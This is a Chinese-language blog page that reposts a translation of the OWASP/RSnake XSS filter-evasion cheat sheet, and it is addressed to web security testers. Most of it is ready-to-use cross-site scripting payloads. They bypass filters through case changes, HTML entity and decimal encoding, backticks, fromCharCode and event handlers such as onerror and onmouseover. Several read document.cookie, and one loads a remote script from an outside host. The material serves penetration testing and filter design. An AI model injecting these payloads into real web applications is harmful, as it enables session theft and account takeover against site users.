<!DOCTYPE html>
<html lang="zh-Hans">
    <!-- title -->




<!-- keywords -->




<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="author" content="wywwzjj">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="wywwzjj">
    
    <meta name="keywords" content="wywwzjj,wywwzjj-ctf,wywwzjj-blog">
    
    <meta name="description" content>
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>xss bypass 备忘录 · wywwzjj&#39;s Blog</title>
    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }

</style>

    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
    
    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
(function( w ){
	"use strict";
	// rel=preload support test
	if( !w.loadCSS ){
		w.loadCSS = function(){};
	}
	// define on the loadCSS obj
	var rp = loadCSS.relpreload = {};
	// rel=preload feature support test
	// runs once and returns a function for compat purposes
	rp.support = (function(){
		var ret;
		try {
			ret = w.document.createElement( "link" ).relList.supports( "preload" );
		} catch (e) {
			ret = false;
		}
		return function(){
			return ret;
		};
	})();

	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
	// then change that media back to its intended value on load
	rp.bindMediaToggle = function( link ){
		// remember existing media attr for ultimate state, or default to 'all'
		var finalMedia = link.media || "all";

		function enableStylesheet(){
			link.media = finalMedia;
		}

		// bind load handlers to enable media
		if( link.addEventListener ){
			link.addEventListener( "load", enableStylesheet );
		} else if( link.attachEvent ){
			link.attachEvent( "onload", enableStylesheet );
		}

		// Set rel and non-applicable media type to start an async request
		// note: timeout allows this to happen async to let rendering continue in IE
		setTimeout(function(){
			link.rel = "stylesheet";
			link.media = "only x";
		});
		// also enable media after 3 seconds,
		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
		setTimeout( enableStylesheet, 3000 );
	};

	// loop through link elements in DOM
	rp.poly = function(){
		// double check this to prevent external calls from running
		if( rp.support() ){
			return;
		}
		var links = w.document.getElementsByTagName( "link" );
		for( var i = 0; i < links.length; i++ ){
			var link = links[ i ];
			// qualify links to those with rel=preload and as=style attrs
			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
				// prevent rerunning on link
				link.setAttribute( "data-loadcss", true );
				// bind listeners to toggle media back
				rp.bindMediaToggle( link );
			}
		}
	};

	// if unsupported, run the polyfill
	if( !rp.support() ){
		// run once at least
		rp.poly();

		// rerun poly on an interval until onload
		var run = w.setInterval( rp.poly, 500 );
		if( w.addEventListener ){
			w.addEventListener( "load", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		} else if( w.attachEvent ){
			w.attachEvent( "onload", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		}
	}


	// commonjs
	if( typeof exports !== "undefined" ){
		exports.loadCSS = loadCSS;
	}
	else {
		w.loadCSS = loadCSS;
	}
}( typeof global !== "undefined" ? global : this ) );
</script>

    <link rel="icon" href="/assets/B.ico">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
    <link rel="preload" href="/scripts/main.js" as="script">
    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
    
    <!-- fancybox -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
    <!-- 百度统计  -->
    
    <!-- 谷歌统计  -->
    
</head>

    
        <body class="post-body">
    
    
<header class="header">

    <div class="read-progress"></div>
    <div class="header-sidebar-menu">&#xe775;</div>
    <!-- post页的toggle banner  -->
    
    <div class="banner">
            <div class="blog-title">
                <a href="/">wywwzjj&#39;s Blog.</a>
            </div>
            <div class="post-title">
                <a href="#" class="post-name">xss bypass 备忘录</a>
            </div>
    </div>
    
    <a class="home-link" href="/">wywwzjj's Blog.</a>
</header>
    <div class="wrapper">
        <div class="site-intro" style="







height:50vh;
">
    
    <!-- 主页  -->
    
    
    <!-- 404页  -->
            
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(https://source.unsplash.com/daily)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
            xss bypass 备忘录
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
            
            <!-- 404 -->
            
        </p>
        <!-- 文章页meta -->
        
            <div class="post-intros">
                <!-- 文章页标签  -->
                
                    <div class="post-intro-tags">
    
        <a class="post-tag" href="javascript:void(0);" data-tags="xss">xss</a>
    
</div>
                
                
                    <div class="post-intro-read">
                        <span>字数统计: <span class="post-count word-count">8.3k</span>阅读时长: <span class="post-count reading-time">32 min</span></span>
                    </div>
                
                <div class="post-intro-meta">
                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
                    <span class="post-intro-time">2019/03/04</span>
                    
                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                        <span class="iconfont-archer">&#xe602;</span>
                        <span id="busuanzi_value_page_pv"></span>
                    </span>
                    
                    <span class="shareWrapper">
                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
                        <span class="shareText">Share</span>
                        <ul class="shareList">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>
        <script>
 
  // get user agent
  var browser = {
    versions: function () {
      var u = window.navigator.userAgent;
      return {
        userAgent: u,
        trident: u.indexOf('Trident') > -1, //IE内核
        presto: u.indexOf('Presto') > -1, //opera内核
        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
        iPad: u.indexOf('iPad') > -1, //是否为iPad
        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
      };
    }()
  }
  console.log("userAgent:" + browser.versions.userAgent);

  // callback
  function fontLoaded() {
    console.log('font loaded');
    if (document.getElementsByClassName('site-intro-meta')) {
      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in');
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb(){
    if (browser.versions.uc) {
      console.log("UCBrowser");
      fontLoaded();
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular']
        },
        loading: function () {  //所有字体开始加载
          // console.log('loading');
        },
        active: function () {  //所有字体已渲染
          fontLoaded();
        },
        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout');
          fontLoaded();
        },
        timeout: 5000 // Set the timeout to two seconds
      });
    }
  }

  function asyncErr(){
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
    s.parentNode.insertBefore(o, s);
  }

  var asyncLoadWithFallBack = function(arr, success, reject) {
      var currReject = function(){
        reject()
        arr.shift()
        if(arr.length)
          async(arr[0], success, currReject)
        }

      async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack([
    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
    "/lib/webfontloader.min.js"
  ], asyncCb, asyncErr)
</script>        
        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
        <div class="container container-unloaded">
            <main class="main post-page">
    <article class="article-entry">
        <p><img src="img/xss-dog.jpg" alt="img"></p>
<center><em>Xss Bypass备忘录</em></center>

<center>技术要发展,免不了风波.</center>

<center>也许这些攻攻防防会更好的促进技术的发展也说不定</center>

<center>就让这一次次的爆破换来将来更精练的技术的无比的宁静吧</center>

<center>我们静观其变吧！</center>

<center>缅怀当初那份最纯真Hacker精神!!<br><center>2017.深圳</center>

<center>By:Legend</center>








<h2 id="译文源起"><a href="#译文源起" class="headerlink" title="译文源起"></a>译文源起</h2><p>翻译本文最初源自国内在对2014年老道翻译的一个版本，发现此版本有些翻译个人认为不太满意，在加上2017年国庆长假漫漫，无人陪伴（主要还是约妹子没约出来！）。所以才对此进行翻译工作，希望对国内各位安全爱好者们有一定帮助吧。请允许译者用自己对此文档见解取一个中文名字—<strong>XSS BYPASS备忘录</strong>。文中所有代码参考OWASP官方复制，同时对于官方文档里面有些描述不太清楚地方译者通过自己对XSS理解加入一些自己见解，来帮助各位对XSS理解更上一个台阶。然后如文档之前说带上一个妹子名字。她说名字不让说，那么咱们姑且叫她小星星吧，翻译版权归她所有。对于翻译难免存在错误。请各位看官见谅！</p>
<p>翻译官方修订的版本：10/2/2017</p>
<p>关于译者：ID太多自己都忘记叫那个比较合适，就叫笑摸二楼狗头吧！</p>
<h2 id="译者说明"><a href="#译者说明" class="headerlink" title="译者说明"></a>译者说明</h2><p>译者为legend,当然也有人叫我小黑.或者…名字这些都不重要.本文部分章节采用了, OWASP Cheat Sheet Series翻译项目, XSS过滤绕过备忘单<a href="#_ftn1">[1]</a>部分小段,大概位于”URL字符串绕过”章节特此说明.因为译者认为他们翻译比我更为通顺.其他部分皆为译者结合全文与相关资料而编写,鄙人不认为说比老道版本好多少或者差多少.每个读者感受不一样,我只能说对自己说:我已经尽力了.</p>
<p>如果有兴趣一起交流技术也欢迎联系我.作为一位安全圈萌新,还需要各位大佬带带,最后感谢自己的团队还有各位老铁们支持,如果没有你们意见或许就没有这份文档出现.关于如何联系我?</p>
<p>因上努力,果上随缘</p>
<p> <br></p>
<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>本文重点是为Web应用安全测试人员提供指导，以协助进行XSS安全测试。本文初始内容由于RSNake从他的开创性XSS备忘录捐赠给OWASP，该页面位于<a href="http://ha.ckers.org/xss.html" target="_blank" rel="noopener">http://ha.ckers.org/xss.html</a>。该网站现在重定向到这里<a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a>。我们计划在这里对它进行维护和更新。同时<a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting" target="_blank" rel="noopener">XSS (Cross Site Scripting) Prevention Cheat Sheet</a>_Prevention_Cheat_Sheet)的第一个版本就是受到RSnake的XSS过滤绕过备忘录启发，所以我们要感谢他的灵感。我们希望创建简单，有效指南，开发人员可以遵循指南防止XSS攻击，而不是简单告诉开发人员构造可以防止在本备忘录中所有花哨技巧的程序，因此就有<a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting" target="_blank" rel="noopener">XSS (Cross Site Scripting) Prevention Cheat Sheet</a>_Prevention_Cheat_Sheet)等安全备忘录系列诞生。</p>
<p><br></p>
<h1 id="测试说明"><a href="#测试说明" class="headerlink" title="测试说明"></a>测试说明</h1><p>这个Bypass备忘录适用于已经了解XSS攻击基础的人群，同时又希望深入了解防护绕过的细微差别。</p>
<p>请注意，大多数这些XSS payload已经在列出浏览器中进行了测试。</p>
<p><br></p>
<h2 id="XSS漏洞挖掘"><a href="#XSS漏洞挖掘" class="headerlink" title="XSS漏洞挖掘"></a>XSS漏洞挖掘</h2><p>在大多数情况下，如果页面没有对XSS进行特别过滤情况下，在存在XSS地方将会弹出”XSS”一词。可以通过URL编码对整个payload进去编码。小技巧：如果想通过快速方法去判断一个页面是否存在XSS，通常只需要在<code>&lt;PLAINTEXT&gt;</code> 标签处注入你的 <code>payload</code>，看看是否被打乱就可以判断是否存在XSS漏洞了。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";   alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--   &gt;<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>"&gt;'&gt;<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">alert(<span class="built_in">String</span>.fromCharCode(<span class="number">88</span>,<span class="number">83</span>,<span class="number">83</span>))</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h2 id="XSS漏洞挖掘2"><a href="#XSS漏洞挖掘2" class="headerlink" title="XSS漏洞挖掘2"></a>XSS漏洞挖掘2</h2><p>如果你没有足够的输入空间，去测试页面是否能执行javascript，则此payload是一个很不错的紧凑型的XSS检测代码。输入代码后，通过此查询页面源代码搜索XSS看他是否存在问题。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'';!--"<span class="tag">&lt;<span class="name">XSS</span>&gt;</span>=&amp;&#123;()&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h2 id="没有任何过滤的利用"><a href="#没有任何过滤的利用" class="headerlink" title="没有任何过滤的利用"></a>没有任何过滤的利用</h2><p>这是一个常规的XSS测试代码,也是最容易被拦截的,但是我建议先尝试(关于引号在任何浏览器中都不需要,所以这里省略);</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">http://demo.wywwzjj.top/public/xss.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>   <br></p>
<h2 id="常见通用XSS绕过利用代码"><a href="#常见通用XSS绕过利用代码" class="headerlink" title="常见通用XSS绕过利用代码"></a>常见通用XSS绕过利用代码</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">'"&gt;&gt;<span class="tag">&lt;<span class="name">marquee</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">confirm(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">marquee</span>&gt;</span>"&gt;<span class="tag">&lt;/<span class="name">plaintext\</span>&gt;</span><span class="tag">&lt;/<span class="name">|\</span>&gt;</span><span class="tag">&lt;<span class="name">plaintext</span>/<span class="attr">onmouseover</span>=<span class="string">prompt(1)</span>&gt;</span> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>@gmail.com<span class="tag">&lt;<span class="name">isindex</span>   <span class="attr">formaction</span>=<span class="string">javascript:alert(/XSS/)</span>   <span class="attr">type</span>=<span class="string">submit</span>&gt;</span>'--&gt;"&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>   </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>"&gt;   </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">id</span>=<span class="string">"confirm&amp;lpar;1)"</span>/<span class="attr">alt</span>=<span class="string">"/"</span><span class="attr">src</span>=<span class="string">"/"</span><span class="attr">onerror</span>=<span class="string">eval(id)</span>&gt;</span>'"&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://www.shellypalmer.com/wp-content/images/2015/07/hacked.jpg"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h2 id="利用image标签执行Java-Script命令"><a href="#利用image标签执行Java-Script命令" class="headerlink" title="利用image标签执行Java Script命令"></a>利用image标签执行Java Script命令</h2><p>利用image标签配合Javascript命令来实现XSS。（IE7.0浏览器不支持Java Script命令在image标签中触发XSS，但是在可以在其他标签中出发。下面例子仅展示一种，其他标签依旧同样可以。）<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">"javascript:alert('XSS');"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>译者注:如文中所说,还有其他方法.此文档未列出了而已.这里译者简单罗列一下.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(String.fromCharCode(88,83,83))</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"URL"</span> <span class="attr">style</span>=<span class="string">'Xss:expression(alert(/xss/));'</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h2 id="对屏蔽引号和分号的绕过"><a href="#对屏蔽引号和分号的绕过" class="headerlink" title="对屏蔽引号和分号的绕过"></a>对屏蔽引号和分号的绕过</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(</span>'<span class="attr">XSS</span>')&gt;</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h2 id="敏感字符检测的绕过"><a href="#敏感字符检测的绕过" class="headerlink" title="敏感字符检测的绕过"></a>敏感字符检测的绕过</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">JaVaScRiPt:alert(</span>'<span class="attr">XSS</span>')&gt;</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h2 id="HTML实体转义"><a href="#HTML实体转义" class="headerlink" title="HTML实体转义"></a>HTML实体转义</h2><p>此样例中分号是必须要的。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(&amp;quot;XSS&amp;quot;)</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h2 id="利用反引号混淆绕过"><a href="#利用反引号混淆绕过" class="headerlink" title="利用反引号混淆绕过"></a>利用反引号混淆绕过</h2><p>如果你需要使用单双引号，但是又被过滤掉，可以使用 ` 来封装你的JavaScript字符串,这个也是很多XSS防护以及过滤器没有考虑到这个字符.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=`<span class="attr">javascript:alert</span>("<span class="attr">RSnake</span> <span class="attr">says</span>,'<span class="attr">XSS</span>'")`&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h2 id="标签的畸形用法"><a href="#标签的畸形用法" class="headerlink" title="\标签的畸形用法"></a>\<a>标签的畸形用法</a></h2><p>利用Href规定链接目标的特性,从而发起XSS攻击,此想法由David Corss 提出,并且在Chrome浏览器上得到验证.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">"alert(document.cookie)"</span>&gt;</span>xss link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>此外Chrome喜欢替你做引号补全,如果你遇到不能被执行的话.那么就直接跳过忽略他们即可.因为Chrome会修复你URL或者脚本中丢失的引号,并且将它们补全.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">alert(document.cookie)</span>&gt;</span>xss link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h2 id="标签的畸形用法-1"><a href="#标签的畸形用法-1" class="headerlink" title="\标签的畸形用法"></a>\<img>标签的畸形用法</h2><p>最早被Begeek发现(可谓短小而精悍的运行在任何浏览器上),这个XSS paylod依靠浏览器的渲染引擎解析IMG标签中的XSS payload,该标签必须在引号内运行.我认为这个最初为了纠正错误编码而出现的.这将意味着可以使用难以理解HTML标签去解析.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> """&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="actionscript">alert(<span class="string">"XSS"</span>)</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>"&gt;</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h2 id="利用fromCharCode方法绕过引号限制"><a href="#利用fromCharCode方法绕过引号限制" class="headerlink" title="利用fromCharCode方法绕过引号限制"></a>利用fromCharCode方法绕过引号限制</h2><p>如果任何形式引号都被拦截的情况下，你可以使用fromCharCode()方法来创造你需要的XSS Payload.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(String.fromCharCode(88,83,83))</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h2 id="利用SRC默认属性绕过-SRC域检测限制"><a href="#利用SRC默认属性绕过-SRC域检测限制" class="headerlink" title="利用SRC默认属性绕过,SRC域检测限制"></a>利用SRC默认属性绕过,SRC域检测限制</h2><p>此方法将绕过大多SRC域过滤器,可以利用事件方法插入任意Java script脚本.此方法也同样适用于From,iframe,input,Embed等任何HTML标记类型元素,同时它还允许标记类型相关事件作为备选进行替换,例如onblur,onclick,在后面为你附近一份可用事件表.由于Abdullah Hussam提供. Abdulahhusam编辑.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">#</span> <span class="attr">onmouseover</span>=<span class="string">"alert('xxs')"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h2 id="将SRC默认值为空"><a href="#将SRC默认值为空" class="headerlink" title="将SRC默认值为空."></a>将SRC默认值为空.</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>= <span class="string">onmouseover</span>=<span class="string">"alert('xxs')"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h2 id="完全不设置SRC属性"><a href="#完全不设置SRC属性" class="headerlink" title="完全不设置SRC属性"></a>完全不设置SRC属性</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">onmouseover</span>=<span class="string">"alert('xxs')"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h2 id="基于erro事件触发"><a href="#基于erro事件触发" class="headerlink" title="基于erro事件触发"></a>基于erro事件触发</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">/</span> <span class="attr">onerror</span>=<span class="string">"alert(String.fromCharCode(88,83,83))"</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h2 id="IMG-onerror-和-Java-script编码绕过"><a href="#IMG-onerror-和-Java-script编码绕过" class="headerlink" title="IMG onerror 和 Java script编码绕过"></a>IMG onerror 和 Java script编码绕过</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">"&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h2 id="十进制在html代码中运用"><a href="#十进制在html代码中运用" class="headerlink" title="十进制在html代码中运用"></a>十进制在html代码中运用</h2><p>此示例所使用的XSS payload无法有些浏览器下使用.&lt;在Gecko引擎下IMG标签在firefox和Netscape 8.1+不起作用&gt;<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span>   <span class="attr">SRC</span>=<span class="string">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;</span>   &amp;#<span class="attr">39</span>;&amp;#<span class="attr">88</span>;&amp;#<span class="attr">83</span>;&amp;#<span class="attr">83</span>;&amp;#<span class="attr">39</span>;&amp;#<span class="attr">41</span>;&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h2 id="十进制且不带分号在html代码中运用"><a href="#十进制且不带分号在html代码中运用" class="headerlink" title="十进制且不带分号在html代码中运用"></a>十进制且不带分号在html代码中运用</h2><p>编码绕过xss过滤器经常会用到”&#XX;”,但是大多数人不太知道编码限制最多允许7位字符.导致错误认为一个html编码需要用;去结束,那些对字符串解码也是同样,\$tmp_string =~ s/.<em>\&amp;#(\d+);.</em>/\$1/.(作者注:无意中发现)<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span>   <span class="attr">SRC</span>=<span class="string">&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;</span>   #<span class="attr">0000108</span>&amp;#<span class="attr">0000101</span>&amp;#<span class="attr">0000114</span>&amp;#<span class="attr">0000116</span>&amp;#<span class="attr">0000040</span>&amp;#<span class="attr">0000039</span>&amp;#<span class="attr">0000088</span>&amp;#<span class="attr">0000083</span>&amp;#<span class="attr">0000083</span>&amp;#<span class="attr">0000039</span>&amp;#<span class="attr">0000041</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
